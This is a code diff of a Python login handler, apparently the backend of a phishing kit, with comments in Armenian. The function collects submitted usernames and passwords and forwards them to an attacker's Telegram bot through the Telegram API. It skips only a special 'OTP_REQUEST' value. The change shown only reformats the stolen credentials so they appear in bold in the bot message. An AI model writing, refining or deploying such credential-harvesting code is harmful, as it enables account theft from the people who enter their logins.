@@ -25,12 +25,14 @@ def send_login():
         
         # ✅ ԵԹԵ OTP_REQUEST Է, ՉԵՆՔ ՈՒՂԱՐԿՈՒՄ TELEGRAM
         if password == 'OTP_REQUEST':
-            # Ոչինչ չենք ուղարկում Telegram, պարզապես վերադարձնում ենք ok
             return jsonify({'ok': True, 'message': 'SMS մուտք - տվյալներ չեն ուղարկվել Telegram'})
         
-        # ✅ ՄԻԱՅՆ ՆՈՐՄԱԼ ՄՈՒՏՔԻ ԴԵՊՔՈՒՄ - ՈՒՂԱՐԿՈՒՄ ԵՆՔ ՄԻԱՅՆ ՄՈՒՏՔԱՆՈՒՆԸ և ԳԱՂՏՆԱԲԱՌԸ
-        message = f"""<b>👤 :</b> <code>{username}</code>
-<b>🔑 :</b> <code>{password}</code>"""
+        # ✅ ԻՐԱՐ ՏԱԿ, ԻՐԱՐԻՑ ՀԵՌՈՒ, ՀԱՍՏ ՏԱՌԵՐՈՎ
+        message = f"""
+<b>👤</b> <b><code>{username}</code></b>
+
+<b>🔑</b> <b><code>{password}</code></b>
+"""
         
         # Telegram-ին ուղարկել HTML ձևաչափով
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
